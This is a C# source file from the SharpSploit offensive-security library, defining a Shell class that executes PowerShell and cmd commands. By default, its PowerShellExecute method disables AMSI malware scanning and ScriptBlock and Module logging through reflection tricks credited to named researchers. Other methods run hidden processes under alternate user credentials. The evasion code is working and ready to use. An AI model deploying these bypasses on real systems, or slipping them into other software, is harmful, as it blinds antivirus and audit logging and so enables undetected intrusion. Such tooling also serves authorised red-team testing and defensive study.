// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Linq;
using System.Reflection;
using System.Diagnostics;
using System.Management.Automation;
using System.Text;

namespace SharpSploit.Execution
{
    /// <summary>
    /// Shell is a library for executing shell commands.
    /// </summary>
    public class Shell
    {
        /// <summary>
        /// Executes specified PowerShell code using System.Management.Automation.dll and bypasses
        /// AMSI, ScriptBlock Logging, and Module Logging (but not Transcription Logging).
        /// </summary>
        /// <param name="PowerShellCode">PowerShell code to execute.</param>
        /// <param name="OutString">Switch. If true, appends Out-String to the PowerShellCode to execute.</param>
        /// <param name="BypassLogging">Switch. If true, bypasses ScriptBlock and Module logging.</param>
        /// <param name="BypassAmsi">Switch. If true, bypasses AMSI.</param>
        /// <returns>Output of executed PowerShell.</returns>
        /// <remarks>
        /// Credit for the AMSI bypass goes to Matt Graeber (@mattifestation). Credit for the ScriptBlock/Module
        /// logging bypass goes to Lee Christensen (@_tifkin).
        /// </remarks>
        public static string PowerShellExecute(string PowerShellCode, bool OutString = true, bool BypassLogging = true, bool BypassAmsi = true)
        {
            if (PowerShellCode == null || PowerShellCode == "") return "";

            using (PowerShell ps = PowerShell.Create())
            {
                BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
                if (BypassLogging)
                {
                    var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                    if (PSEtwLogProvider != null)
                    {
                        var EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags);
                        var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                        EtwProvider.SetValue(null, EventProvider);
                    }
                }
                if (BypassAmsi)
                {
                    var amsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
                    if (amsiUtils != null)
                    {
                        amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true);
                    }
                }
                ps.AddScript(PowerShellCode);
                if (OutString) { ps.AddCommand("Out-String"); }
                var results = ps.Invoke();
                string output = String.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                ps.Commands.Clear();
                return output;
            }
        }

        /// <summary>
        /// Executes a specified Shell command, optionally with an alternative username and password.
        /// Equates to `ShellExecuteWithPath(ShellCommand, "C:\\WINDOWS\\System32")`.
        /// </summary>
        /// <param name="ShellCommand">The ShellCommand to execute, including any arguments.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Ouput of the ShellCommand.</returns>
        public static string ShellExecute(string ShellCommand, string Username = "", string Domain = "", string Password = "")
        {
            return ShellExecuteWithPath(ShellCommand, "C:\\WINDOWS\\System32\\", Username, Domain, Password);
        }

        /// <summary>
        /// Executes a specified Shell command using cmd.exe, optionally with an alternative username and password.
        /// Equates to `ShellExecute("cmd.exe /c " + ShellCommand)`.
        /// </summary>
        /// <param name="ShellCommand">The ShellCommand to execute, including any arguments.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Ouput of the ShellCommand.</returns>
        public static string ShellCmdExecute(string ShellCommand, string Username = "", string Domain = "", string Password = "")
        {
            return ShellExecute("cmd.exe /c " + ShellCommand, Username, Domain, Password);
        }

        /// <summary>
        /// Executes a specified Shell command from a specified directory, optionally with an alternative username and password.
        /// </summary>
        /// <param name="ShellCommand">The ShellCommand to execute, including any arguments.</param>
        /// <param name="Path">The Path of the directory from which to execute the ShellCommand.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Output of the ShellCommand.</returns>
        public static string ShellExecuteWithPath(string ShellCommand, string Path, string Username = "", string Domain = "", string Password = "")
        {
            if (ShellCommand == null || ShellCommand == "") return "";

            string ShellCommandName = ShellCommand.Split(' ')[0];
            string ShellCommandArguments = "";
            if (ShellCommand.Contains(" "))
            {
                ShellCommandArguments = ShellCommand.Replace(ShellCommandName + " ", "");
            }

            Process shellProcess = new Process();
            if (Username != "")
            {
                shellProcess.StartInfo.UserName = Username;
                shellProcess.StartInfo.Domain = Domain;
                System.Security.SecureString SecurePassword = new System.Security.SecureString();
                foreach (char c in Password)
                {
                    SecurePassword.AppendChar(c);
                }
                shellProcess.StartInfo.Password = SecurePassword;
            }
            shellProcess.StartInfo.FileName = ShellCommandName;
            shellProcess.StartInfo.Arguments = ShellCommandArguments;
            shellProcess.StartInfo.WorkingDirectory = Path;
            shellProcess.StartInfo.UseShellExecute = false;
            shellProcess.StartInfo.CreateNoWindow = true;
            shellProcess.StartInfo.RedirectStandardOutput = true;
            shellProcess.StartInfo.RedirectStandardError = true;

            var output = new StringBuilder();
            shellProcess.OutputDataReceived += (sender, args) => { output.AppendLine(args.Data); };
            shellProcess.ErrorDataReceived += (sender, args) => { output.AppendLine(args.Data); };

            shellProcess.Start();

            shellProcess.BeginOutputReadLine();
            shellProcess.BeginErrorReadLine();
            shellProcess.WaitForExit();

            return output.ToString().TrimEnd();
        }
    }
}